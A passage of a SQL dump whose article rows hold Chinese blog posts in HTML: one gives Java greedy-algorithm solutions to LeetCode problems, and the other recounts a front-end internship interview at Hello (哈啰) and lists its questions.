class-name\">ArrayList</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">&gt;</span></span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n	<span class=\"token comment\">// 判断区间内字符串是否不存在hash字典中</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">checkAdd</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> s<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> hash<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> left<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> right<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> left<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> right<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">char</span> c <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">[</span>c <span class=\"token operator\">-</span> <span class=\"token string\">\'0\'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>  \n                <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>百分之90了，激不激动！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610225434698.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"15httpsleetcodecncomproblemsmonotoneincreasingdigits_677\"></a><a href=\"https://leetcode-cn.com/problems/monotone-increasing-digits/\">15.单调递增的数字</a></h2> \n <blockquote> \n  <p>给定一个非负整数 N，找出小于或等于 N 的最大的整数，同时这个整数需要满足其各个位数上的数字是单调递增。<br> （当且仅当每个相邻位数上的数字 x 和 y 满足 x &lt;= y 时，我们称这个整数是单调递增的。）<br> <img src=\"https://img-blog.csdnimg.cn/20210610195623516.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 我们根据正常思路来分析这道题，比如332这个例子来说：我们人眼扫描一下，大概这么分析的想让它变成单调递增的最大整数，第一眼就是把332变成329，这是第一步，第二步在变成229，满足条件的情况下，将中间可以调整的数字（2处在[2,9]中间）尽量的变到范围内的最大，即9.这样229就变成了299，满足单调递增条件的同时是最大的N，同理分析。遇到其他这种可以将每一位的数字都尽可能的“拉到最大”。是不是只需要将 xy… （其中x &gt; y） 变成x-1 99…9就可以了。这样又满足单调递增，又满足最大N了。再给大家分析一个较为一般化例子：123321<br> <img src=\"https://img-blog.csdnimg.cn/20210610200906743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 我们发现在求解这个最终值的时候就是在尽可能的让后面的数字变成9，这样子既满足单调递增，又满足最大。那我们如何确定什么时候开始填充9呢？我们明确填充9的目的，<strong>并不是盲目填充</strong>，比如题目中的样例1234就很好的符合了单调最大的特点，不需要填充9， <strong>只有遇到了前一位大于后一位产生了非单调递增的时候，我们进行填充工作</strong>，同时<strong>将前一位减小一避免超过了原来的值</strong>。分析完，我们只需要得知哪里开始不满足前一位比后一位小。找到了后开始我们的 - 1和填充 9 的工作，问题来了 在遍历序列的时候，我们该<strong>以什么方向遍历比较好呢？</strong> 为了能够更好的利用已经修改过的值以及避免重复工作，我们通过举的例子发现， <strong>从后向前扫描可以在一次扫描内就可以完成替换工作</strong>，而不会出现前一位减1后又小于前前1位这样的尴尬局面。<br> <strong>问题抽象：</strong><br> 第一次遍历：从后向前遍历，确定哪里开始不满足前一位小于后一位，并将不满足的前一位减小1位，记录下来该位置，用来后续填充后面位置为9。<br> 第二次遍历：从记录下来的位置开始，向后全部填充9。返回答案。<br> <strong>实现步骤：</strong><br> 1、将数字n转换成字符数组。<br> 2、倒叙遍历数组，同时修改不满足条件的值，另前一位-1，并记录下来不满足条件的最后位置。<br> 3、从不满足条件的最后的位置开始，将后面所有位置9。<br> 4、返回数组转换成数字。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">monotoneIncreasingDigits</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    	<span class=\"token comment\">// 将数字转换成字符数组</span>\n        <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> num <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toCharArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> start <span class=\"token operator\">=</span> num<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 倒序遍历</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> num<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 找到不满足条件的位置</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;</span> num<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 更新并记录不满足条件的最前面的位置</span>\n                start <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 将前面数字减1</span>\n                num<span class=\"token punctuation\">[</span>i <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 将记录下来最前面不满足条件位置后面所有的数字置9</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> start<span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> num<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            num<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\'9\'</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token comment\">// 转换成数字返回</span>\n        <span class=\"token keyword\">return</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>还有两道题！！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610225841206.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"16httpsleetcodecncomproblemsbesttimetobuyandsellstockwithtransactionfee_724\"></a><a href=\"https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock-with-transaction-fee/\">16.买卖股票的最佳时机含手续费</a></h2> \n <blockquote> \n  <p>给定一个整数数组 prices，其中第 i 个元素代表了第 i 天的股票价格 ；非负整数 fee 代表了交易股票的手续费用。<br> 你可以无限次地完成交易，但是你每笔交易都需要付手续费。如果你已经购买了一个股票，在卖出它之前你就不能再继续购买股票了。<br> 返回获得利润的最大值。<br> 注意：这里的一笔交易指买入持有并卖出股票的整个过程，每笔交易你只需要为支付一次手续费。<br> <img src=\"https://img-blog.csdnimg.cn/20210610211536598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 老实说，这道题我刚刚看见的时候也有点懵，这也能贪心的吗？我自己举了两个例子，给大家一起分析一下这道题的思路：<br> 例子一：<br> [1, 4, 9] fee = 2的情况：1的时候买入4的时候卖出，4的时候买入9的时候卖出， 总profit = 4 - 1 - 2 + 9 - 4 - 2 = 4 而更好的策略是 1买入， 9 卖出 ： 总profit = 9 - 1 - 2 = 6<br> 这个时候我们就要考虑，遇到这个时候我们该怎么办了？我们换一种思路，我们更新profit = 4 - 1 - 2，并且持有 4 - 2 = 2的股票，这样遇到9的时候就不会因为多扣除2块钱的手续费而亏损了。（相当于计算利润并继续持有，并没有完全的卖出）<br> 例子二： [1, 4, 3, 9] fee = 2的情况：<br> 按章上面的思路 1的时候买入，4的时候假装卖出。更新profit = 4 - 1 - 2 = 1；然后当前持有2 在 3的时候卖掉会亏1块钱，所以不卖，在9的时候卖 这样第二波就是 profit += 9 - 2 - 2 ； profit = 6 满足正确答案。<br> <strong>问题抽象：</strong><br> 确定买入价格，如果股票价格低于买入价格，就更新买入价格为更低的那个，如果遇到卖了能涨价的股票就更新利润，并持有卖出的便宜了 <code>fee</code> 块钱的股票。化归初始状态。<br> <strong>实现步骤：</strong><br> 1、初始化买入价格。<br> 2、循环遍历：遇到比初试价格便宜的就更新买入价格。<br> 3、遇到卖了能赚钱的股票就卖出股票，并持有相当于少了 <code>fee</code> 的等额股票。`</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">maxProfit</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> prices<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> fee<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span> n <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 初始化买入价格</span>\n        <span class=\"token keyword\">int</span> buy <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> profit <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> n<span class=\"token punctuation\">;</span> i <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 遇到更便宜的股票， 买入</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>buy <span class=\"token operator\">&gt;</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                buy <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 遇到卖了能赚钱的股票</span>\n            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>buy <span class=\"token operator\">&lt;</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> fee<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            	<span class=\"token comment\">// 卖出， 并计算利润</span>\n                profit <span class=\"token operator\">+=</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> buy <span class=\"token operator\">-</span> fee<span class=\"token punctuation\">;</span>\n                <span class=\"token comment\">// 持有相当于减了手续费的股票</span>\n                buy <span class=\"token operator\">=</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> fee<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> profit<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>就剩最后一题了！！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610225600518.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"17httpsleetcodecncomproblemsbinarytreecameras_770\"></a><a href=\"https://leetcode-cn.com/problems/binary-tree-cameras/\">17.监控二叉树</a></h2> \n <blockquote> \n  <p>给定一个二叉树，我们在树的节点上安装摄像头。<br> 节点上的每个摄影头都可以监视其父对象、自身及其直接子对象。<br> 计算监控树的所有节点所需的最小摄像头数量。<br> <img src=\"https://img-blog.csdnimg.cn/20210610221720283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210610221735702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路</strong>: </font><br> <strong>问题分析</strong>：<br> 这道题看上去比较复杂，不过我们通过示例可以看出来，要想覆盖所有的，又想是摄像头最少，肯定是从叶子结点开始考虑是否安插摄像头了，举个例子一看就明白了，上图：<br> <img src=\"https://img-blog.csdnimg.cn/20210610222220432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 有这么一个例子的话，如果从头节点开始看，没有被覆盖到，装一个摄像头后，叶子节点都没有被覆盖到，这样叶子结点们就得继续装摄像头，如图：<br> <img src=\"https://img-blog.csdnimg.cn/20210610222433176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 而我如果从叶子结点开始看，将摄像头放在叶子结点的上面，这样我们就可以大大减少了摄像头的使用：<br> <img src=\"https://img-blog.csdnimg.cn/20210610222542578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 这时候不管头节点有没有被覆盖到，顶多结果就差1，而从上往下看的话，就可能差2的h次方个摄像头了。因此，这道题的<strong>贪心策略是从下往上看</strong>的。那么<strong>如何遍历树才能实现从下往上看</strong>呢，不难知道肯定是二叉树的后续遍历了。那么<strong>如何确定结点是否需要安装摄像头呢？/</strong> 这时候我们就得定义返回值类型，来通过左右孩子的状态来判断是否需要安装摄像头了。这里我们定义<strong>3种状态</strong>来描述所有可能的情况：<br> <strong>第一种</strong>：0 -&gt; 表示没有被覆盖到。<br> <strong>第二种</strong>：1 -&gt; 表示被覆盖到了。<br> <strong>第三种</strong>：2 -&gt; 表示有摄像头（和第二种的区别就是儿子和父亲都是状态1）。<br> 定义完状态，我们就可以根据状态来确定当前结点是否需要安装摄像头了，这里有这么几种情况：<br> <strong>第一种情况：</strong> 左右孩子都被覆盖到了，我们就不需要安装摄像头了，因为安装要浪费重叠的部分，我们返回0，让这个节点的父亲来安装摄像头。这样可以节省。<br> <strong>第二种情况：</strong> 左右孩子有没被覆盖到的，我们就必须安装摄像头，确保每个节点必须被覆盖到。<br> <strong>第三种情况：</strong> 左右孩子有摄像头，我们就返回1，表示这个节点被覆盖到了。<br> 只要明确了贪心策略，状态集合，遍历方式，以及返回值类型，就可以轻松写出后续遍历的代码啦。<br> <strong>问题抽象：</strong><br> 定义后续遍历函数，确定空节点返回-1，进行左右递归，根据左右孩子的类型，进行相应的返回值，如果需要更新摄像头数量，就进行更新。<br> <strong>实现步骤：</strong><br> 1、定义后续遍历函数。<br> 2、确定空节点返回类型。<br> 3、递归左孩子与右孩子。<br> 4、对后序遍历的结果来确定左右孩子的父亲是否需要安装摄像头，或者返回1，或者0。<br> 5、递归这个过程，最后判断根节点是否需要安装摄像头。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">minCameraCover</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TreeNode</span> root<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    	<span class=\"token comment\">// 最后判断头节点需不需要安装摄像头</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">postOrderTraverel</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> count<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">// 返回值，-1:表示空节点 0:表示无覆盖 1:表示有覆盖 2:表示放置摄像头</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> <span class=\"token function\">postOrderTraverel</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">TreeNode</span> root<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>root <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n		<span class=\"token comment\">// 后序遍历方式</span>\n        <span class=\"token keyword\">int</span> left <span class=\"token operator\">=</span> <span class=\"token function\">postOrderTraverel</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> right <span class=\"token operator\">=</span> <span class=\"token function\">postOrderTraverel</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n		<span class=\"token comment\">// 只要有一个没覆盖到，就要返回2，并安装摄像头	</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> right <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n		<span class=\"token comment\">// 只要有一个有摄像头，就返回1</span>\n		<span class=\"token comment\">// 注意这里不包括一个孩子没覆盖的情况，在上面已经优先返回了</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> right <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n		<span class=\"token comment\">// 0表示没有覆盖到，叶子节点也属于0</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p><strong>恭喜你！你已经无可匹敌了！</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610225701557.png\" alt=\"在这里插入图片描述\"><br> <strong>噫？为什么少了3分？</strong><br> <mark>当然是剩下的一键三连啦！！<mark></mark></mark></p> \n </blockquote> \n <p><strong>辛苦肝了这么久点个三连叭～</strong><br> <img src=\"https://img-blog.csdnimg.cn/20210610230400585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><strong>恭喜你三连成功～</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610230058871.png\" alt=\"在这里插入图片描述\"><br> <strong>关注我，及时看到最新的算法题集详细归纳整合讲解！</strong><br> <strong>让我们一起进步吧～</strong></p> \n <hr> \n <p><strong>下一期：动态规划很难吗？大厂面试总是问？从此不再怕dp！</strong></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 1);
INSERT INTO `t_article` VALUES (44, '哈啰前端一面+二面 已拿offer', '<div id=\"content_views\" class=\"htmledit_views\"> \n <h1>前言：</h1> \n <p>面试技巧另外开篇再说，先上面试干货吧。面试的题目并不一定有严格的顺序关系，有的是从前一个问题延伸而来，（探究的是一个知识的深度），有的是考察面试者的知识广度、有的纯粹是我想到哪里写到哪里的啦。。不要太在意哈，最近工作有点忙。</p> \n <p>&nbsp;</p> \n <h2>哈啰一面</h2> \n <p>电话面，整体感觉很好，面试小哥哥我一开始听声音觉得很严肃，但面着面着发现很好，还会引导我，我说对了还会赞同我，面试体验极佳，面完小哥哥说我基础掌握的挺好的，基本上都答得上来，会有二面面试官联系的</p> \n <ol>\n  <li>自我介绍</li>\n  <li>简单介绍了一下项目</li>\n  <li>小程序的样式适配怎么做的</li>\n  <li>CSS弹性布局，如果想给容器里面某一个项目设置在交叉轴上的排列与其他不同怎么设置（align-self）</li>\n  <li>CSS选择器（常见的，伪类选择器用过哪些，::before ::after应用场景），选择器优先级排列</li>\n  <li>CSS函数用过嘛？常见的calc()函数 计算长度值， var()</li>\n  <li>CSS变量&nbsp; &nbsp;css中原生变量定义是通过&nbsp;--前缀来实现,后面可以自定义变量名称</li>\n  <li>js如何判断数组&nbsp; &nbsp;Array.isArray()&nbsp; &nbsp; &nbsp;instanceof 原理</li>\n  <li>原型链</li>\n  <li>JS对象深拷贝&nbsp; JSON.Stringify() + JSON.parse()，缺点不能拷贝function</li>\n  <li>字符串翻转</li>\n  <li>事件循环机制</li>\n  <li>二分法查找时间复杂度O(logn)、 快排时间复杂度O(nlogn)</li>\n  <li><a href=\"/jump/super-jump/word?word=%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97\">斐波那契数列</a><a href=\"/jump/super-jump/word?word=%E7%AE%97%E6%B3%95\">算法</a>分析</li>\n  <li>栈和队列的区别</li>\n  <li>打印<a href=\"/jump/super-jump/word?word=%E4%BA%8C%E5%8F%89%E6%A0%91\">二叉树</a>用什么数据结构 队列</li>\n  <li>遍历<a href=\"/jump/super-jump/word?word=%E9%93%BE%E8%A1%A8\">链表</a></li>\n  <li><a href=\"/jump/super-jump/word?word=%E8%81%8C%E4%B8%9A%E8%A7%84%E5%88%92\">职业规划</a></li>\n </ol> \n <p>&nbsp;</p> \n <h2>哈啰二面&nbsp;</h2> \n <p>部门是做供应链的，二面面试官是<a href=\"/jump/super-jump/word?word=%E5%89%8D%E7%AB%AF\">前端</a>的负责人，还挺好的，聊的也很开心</p> \n <ol>\n  <li>自我介绍</li>\n  <li>聊了<a href=\"/jump/super-jump/word?word=%E9%A1%B9%E7%9B%AE\">项目</a> \n   <ol>\n    <li> \n     <ul>\n      <li>第一个<a href=\"/jump/super-jump/word?word=%E9%A1%B9%E7%9B%AE\">项目</a></li>\n      <li>功能，用户分类</li>\n      <li>数据库建表</li>\n      <li>express框架、其他node框架</li>\n     </ul> \n     <ul>\n      <li>Token怎么存储的，sessionStorgae，有没有其他方法</li>\n      <li>第二个<a href=\"/jump/super-jump/word?word=%E9%A1%B9%E7%9B%AE\">项目</a> 小程序</li>\n     </ul></li>\n   </ol></li>\n  <li>遍历数组的方法 for…of map every some filter forEach</li>\n  <li>遍历对象的方法 for…in Object.keys()</li>\n  <li>怎么学习的，看了什么书，《你不知道的<a href=\"/jump/super-jump/word?word=JavaScript\">JavaScript</a>》</li>\n  <li>有什么其他亮点，比如博客啥的</li>\n  <li>问有没有其他offer</li>\n  <li>实习时间，时长</li>\n  <li>反问</li>\n </ol> \n <ul>\n  <li>主动介绍部门业务，方向</li>\n  <li>实习生培养</li>\n  <li>供应链是干嘛的</li>\n </ul> \n <h3>最后</h3> \n <p><strong>一</strong>个好的心态和一个坚持的心很重要，很多冲着高薪的人想学习前端，但是能学到最后的没有几个，遇到困难就放弃了，这种人到处都是，就是因为有的东西难，所以他的回报才很大，我们评判一个前端开发者是什么水平，就是他解决问题的能力有多强。</p> \n <p>博主整理了一些简单的前端面试题以及学习路线给大家，<strong><a href=\"https://docs.qq.com/doc/DSlNuUUFPWmpZVlJh\">狂戳这里即可免费领取</a></strong></p> \n <p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/img_convert/07a77ec628236a4f8ae253567de6ced0.png\"></p> \n <p><img alt=\"\" src=\"https://img-blog.csdnimg.cn/img_convert/20be6f0380bdc9d4acd1f25758185f57.png\"></p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n <p>&nbsp;</p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 1);
